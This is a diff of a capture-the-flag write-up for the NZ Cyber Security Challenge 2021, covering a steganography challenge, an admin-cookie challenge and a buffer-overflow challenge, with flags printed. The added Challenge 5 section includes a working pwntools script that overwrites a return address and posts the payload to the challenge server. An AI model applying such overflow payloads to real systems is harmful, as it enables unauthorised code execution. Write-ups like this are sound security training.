@@ -1,10 +1,14 @@
 # NZ Cyber Security Challange 2021
 
 ## Challenge 2
-The challenge provides a picture of a scientist cleaning a black board. Steganography is used to hide the board's contents.<br/>
+The challenge provides a picture of a scientist cleaning a black board. Steganography is used to hide the board's contents.
+
 ![Original image](chal2/Sunshine.jpg)
-You can already see a little bit. Many tools can be used to reveal but I used Photoshop with its Blending feature.<br/>
+
+You can already see a little bit. Many tools can be used to reveal but I used Photoshop with its Blending feature.
+
 ![Modified image](chal2/Sunshine-unveiled.jpg)
+
 And we got the flag:
 ```
 flag{A2QB7G#MagnesiumChlorideHexahydrate000000}
@@ -30,6 +34,42 @@ So we need to somehow prove that we are admin. I tried setting cookie but that d
 The Admin panel page has Carlos and Bob names with delete buttons next to them. Exterminate Carlos and we got the flag
 ```
 flag{R5D3SM#Heptadecan-9-yl0000000000000000000}
+```
+
+## Challenge 5
+An executable file named "buff" was given along with a form to send some input to it on the server. Opening the file in Ghidra quickly shows a function called `helper` call `cat flag.txt` but the function itself isn't called anywhere.
+
+![helper function](chal5/helper.jpg)
+
+In `overflow` function, which is basicly `main`, we can see that we have a buffer-overflow here, we can use this to overwrite the return address to point to `helper` function.
+
+![overflow](chal5/overflow.jpg)
+
+The address can be obtained in different ways, I prefer pwntools because I will use python to send POST request to server anyway.
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+import requests
+import re
+
+elf = ELF("./buff")
+
+print("Found helper at: " + str(p32(elf.symbols['helper']))[2:-1])
+
+payload = b"A" * 516 + p32(elf.symbols['helper'])
+
+r = requests.post("https://r0.nzcsc.org.nz/challenge5/", data={"message": payload}, timeout=5)
+print(re.search("flag{.*}", r.text).group())
+```
+or [here](chal5/payload.py)
+
+516 bytes padding is the sweet spot here, following is the address of `helper`. The server may lag sometimes so just run the script again.
+
+And the flag
+```
+flag{3cj2kx#4-hydroxybutylZanediyl000000000000}
 ```
 
 ## Challenge 6
